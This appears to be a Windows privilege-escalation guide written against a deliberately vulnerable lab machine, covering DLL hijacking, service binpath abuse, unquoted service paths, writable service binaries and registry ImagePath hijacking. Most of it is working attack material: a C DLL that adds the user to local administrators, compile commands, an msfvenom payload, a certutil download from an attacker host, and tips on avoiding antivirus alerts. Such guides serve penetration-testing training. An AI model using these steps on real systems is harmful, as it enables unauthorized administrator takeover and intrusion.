# Windows-PrivEsc

## DLL Hijacking
1. Make sure C:\Temp in the Victim Machine is a writable location for standard user.
2. DLL Injection can be done via modifying any dll file in windows which can be run by the user.
3. We can modify the dll or make our own dll .
4. The dll file can be made by compiling the following code in the attacker machine and then placing it under C:\Temp in  Victim’s machine.

CODE:
```
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
   if (dwReason == DLL_PROCESS_ATTACH) {
       system("cmd.exe /k net localgroup administrators $USER$ /add");
       ExitProcess(0);
   }
   return TRUE;
}
```

5. Replace $USER$ with standard user name account and the compile it with mingw ,
6. For 64 bit - ```x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll```
For 32 bit-  ```i686-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll```

The above command will generate the dll file , which we will place in C:\Temp
7. Execute the dll file inside the victim via inbuilt windows command i.e RUNDLL32.EXE
Syntax for running the dll file :

In command prompt :
   ``` 
    cd /
    cd /Temp
    RUNDLL32.EXE hijackme.dll
   ```

Boom.!  your user is now added to the local administrator group and you are having the full admin privileges .
- - -

The Accesschk tool is highly recommended to assess any sort of permissions more efficiently. Accesschk is not limited to registry keys it also enables the user to view the access lists of different Windows objects such files, processes, users and groups, and services. One of the most useful features of the tool is that
it returns objects to which a particular user or group may have write access. Using Accesschk on victim machine could be smart but also pretty risky as well so why using it?
Accesschk is a part of Sysinternals Suite which is a singed tool by Microsoft so anti viruses won’t alert when you will drop this tool on the victim machine, however on a large domain environment which have some Security products like SIME and some logical security rule sets you can get caught because it’s not common when a normal user will use Accesschk.

## Binpath

1. After gettig a initial shell, run the following command in your attackers machine, or directly run it into windows VM.
   ```
   accesschk64.exe -wuvc daclsvc
   -w	Show only objects that have write access
   -u	Suppress errors
   -v	Verbose
   -c	Name is a Windows Service
   ```

![0](images/binpath/1.png)

Notice that the output suggests that the user has the “SERVICE_CHANGE_CONFIG” permission.


2. Now type the following command, it will set the binpath to "net localgroup administrators user /add". And when the service will start again, this command will get executed and our user will be added in administrators group. Hence we will escalate privileges.
 
```sc config daclsvc binpath= "net localgroup administrators user /add"```

![0](images/binpath/2.png)

3. Now start the service by typing the following command.
 ```sc start daclsvc```

4. As we can see our user has been added in the administrators group.
![0](images/binpath/3.png)

- - -
## Unquoted path

1. Type the following command.
 
```sc qc unquotedsvc```
"sc qc - Displays the configuration of a particular service"

![0](images/unquote/1.png)

2. Create a executable file with name "common"

 ```msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe```
![0](images/unquote/2.png)

3. Transfer the file to windows machine and move it into "C:\Program Files\Unquoted Path Service"

```certutil.exe -urlcache -f http://192.168.43.97:8000/common.exe common.exe```

4. Now start the service by typing the following command. When the service will start, it will take the file from C:\Program Files\Unquoted Path Service\Common Files\ but we have placed our payload named common.exe in C:\Program Files\Unquoted Path Service\ so it will execute our malicious file instead of path exploiting the "unquoted path".
 
```sc start unquotedsvc```

![0](images/unquote/3.png)

5. As we can see our user has been added in the administrators group.
![0](images/unquote/4.png)

- - -
## Fileperm

1. Type the following command.
```sc qc filepermsvc```

![0](images/fileperm/1.png)

2. Now type the following command in the terminal.

```accesschk64.exe "C:\Program Files\File Permissions Service\filepermservice.exe"```

![0](images/fileperm/2.png)

3. Create a malicious file with the following payload or you can transfer the windows_service.c file from C:\Users\user\Desktop\Tools\Source folder to your attacker machine and edit it like following.

![0](images/reg/4.png)

4. Now compile it into an executable and transfer back to windows machine.

```x86_64-w64-mingw32-gcc windows_service.c -o filepermservice.exe```

5. Now copy the file from Temp directory to the location.

```copy /y c:\Temp\filepermservice.exe "c:\Program Files\File Permissions Service\filepermservice.exe"```

6. Start the service by typing the following command.
 ```sc start filepermsvc```

7. As we can see our user has been added in the administrators group.
![0](images/unquote/4.png)

- - -
## Services (Registry)
1. Getting a Powershell from initial shell.
![0](images/reg/1.png)
![0](images/reg/2.png)

The Get-Acl cmdlet gets objects that represent the security descriptor of a file or resource. The security descriptor contains the access control lists (ACLs) of the resource. The ACL specifies the permissions that users and user groups have to access the resource. 

2. Now type the following command in your terminal. 
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
-Path => Specifies the path to a resource. Get-Acl gets the security descriptor of the resource indicated by the path.
```
This uses the Get-Acl cmdlet to get the security descriptor of the Control subkey (HKLM:\SYSTEM\CurrentControlSet\services\regsvc) of the registry.

![0](images/reg/3.png)

3. Create a malicious file with the following payload or you can transfer the windows_service.c file from C:\Users\user\Desktop\Tools\Source folder to your attacker machine and edit it like following.

![0](images/reg/4.png)

4. Now compile it into an executable and transfer back to windows machine.
```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

5. Copy it to C:\Temp directory

6. Now run the following command 
```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f```

![0](images/reg/5.png)

7. Start the service by typing the following command.
```sc start regsvc```

8. As we can see our user has been added in the administrators group.

![0](images/reg/6.png)
